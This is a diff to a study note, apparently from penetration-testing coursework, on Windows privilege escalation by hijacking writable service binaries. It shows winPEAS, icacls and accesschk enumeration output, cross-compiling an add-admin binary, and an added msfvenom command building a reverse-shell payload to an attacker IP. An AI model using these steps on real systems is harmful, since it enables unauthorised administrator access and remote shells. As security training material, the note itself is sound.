@@ -36,8 +36,22 @@ mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=
 ...
 ```
 The listed services are installed in either `C:\xampp` or `C:\Windows\system32`. When a binary is installed in `\xampp`  that usually indicates that it is *user-installed* and the service's developer *is in charge of the directory structure as well as the binary's permissions*. These are **PRIME TARGETS** for binary hijacking (if the developer mis-configured their permissions). 
+#### winPEAS
+You can also use the `servicesinfo` module of [winPEAS](../../../cybersecurity/TTPs/actions-on-objective/tools/winPEAS.md) to check for executables which are *writable* for our current user:
+```powershell
+.\winPEASany.exe quite servicesinfo
+...
+  [+] Modifiable Services(T1007)
+   [?] Check if you can modify any service https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+    AJRouter: AllAccess
+   ...
+    filepermsvc: Start, AllAccess
+    FontCache: Start, AllAccess
+```
+In the output above, `filepermsvc` and `FontCache` are writable by all users.
 ### Enumerating Service Permissions
-To find out what the permissions are for the two `\xampp` binaries, we can use either the `icacls` [Windows](../../../computers/windows/README.md) utility or the PowerShell cmdlet `Get-ACL`. 
+To find out what the permissions are for the two `\xampp` binaries, we can use either the `icacls` [Windows](../../../computers/windows/README.md) utility or the PowerShell cmdlet `Get-ACL`. We can also use `accesschk.exe`
 #### `icacls`
 The [icacls utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) outputs the permissions mask of  whatever principal/ application you feed to it. On Windows, icacls permission masks can be decoded with this table (similar to [Umask Bits](../../../PNPT/PEH/kali-linux/file-permissions.md#Umask%20Bits) on [Linux](../../../computers/linux/README.md)):
 
@@ -48,7 +62,6 @@ The [icacls utility](https://docs.microsoft.com/en-us/windows-server/administrat
 | RX   | Read and execute access |
 | R    | Read-only access        |
 | W    | Write-only access       |
-
 As an example, lets run the `icacls` tool on the Apache `httpd.exe` binary:
 ```powershell
 PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
@@ -74,7 +87,24 @@ C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
 
 Successfully processed 1 files; Failed processing 0 files
 ```
-**BINGO**! According to the output, `dave` has *full access* to the `mysqld.exe` service binary which means we can perform service hijacking on it by overwriting the file with our own executable
+**BINGO**! According to the output, `dave` has *full access* to the `mysqld.exe` service binary which means we can perform service hijacking on it by overwriting the file with our own executable.
+#### `accesschck.exe`
+[AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) is part of Windows SysInternals. In this scenario, we can use it to double check the access and persmissions attached to potentially vulnerable executables. For example, if we check `filepermservice.exe` (which we found with `winPEAS`) it would look like this:
+```powershell
+PS C:\Users\admin> .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
+C:\Program Files\File Permissions Service\filepermservice.exe
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW Everyone
+        FILE_ALL_ACCESS
+  RW NT AUTHORITY\SYSTEM
+        FILE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        FILE_ALL_ACCESS
+  RW WINDOWS-10-OSCP\vboxuser
+        FILE_ALL_ACCESS
+  RW BUILTIN\Users
+        FILE_ALL_ACCESS
+```
 ### Writing a Malicious Binary
 Now that we have a target service binary, we need to create the malcious binary we want to replace it with. We can write a simple binary using [C](../../../coding/languages/C.md) which creates a new user named `dave2` and adds that user to the local `Administrators` group. Then we'll cross compile it (on our Kali machine) to run on the Windows victim machine. 
 
@@ -96,6 +126,11 @@ int main ()
 To cross compile it on our Kali machine to a 64-bit Windows binary, we need to use `mingw-64`. Assume our C file is called `adduser.c`:
 ```bash
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+#### Using `msfvenom`
+Instead of writing a malicious binary yourself, you could also replace the affected binary with a reverse shell created with [MSFvenom](../../../cybersecurity/TTPs/exploitation/tools/metasploit.md#MSFvenom):
+```bash
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f dll -o filepermservice.exe
 ```
 ### Infiltrating the Binary
 Now that we've cross compiled `adduser.c` to our Windows binary `adduser.exe` we can transfer it to the victim machine. Again, we can do this with a [python](../../../coding/languages/python/python.md) web server and `iwr` to fetch it from the victim machine:
@@ -166,4 +201,5 @@ Check out the [PowerUp.ps1](powerUp-ps1.md) notes.
 > [!Resources]
 > - [**win32_service**](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes)
 > - [icacls utility](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
+> - [AccessChk.exe](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) 
 > - My [own notes](https://github.com/trshpuppy/obsidian-notes) linked throughout the text.
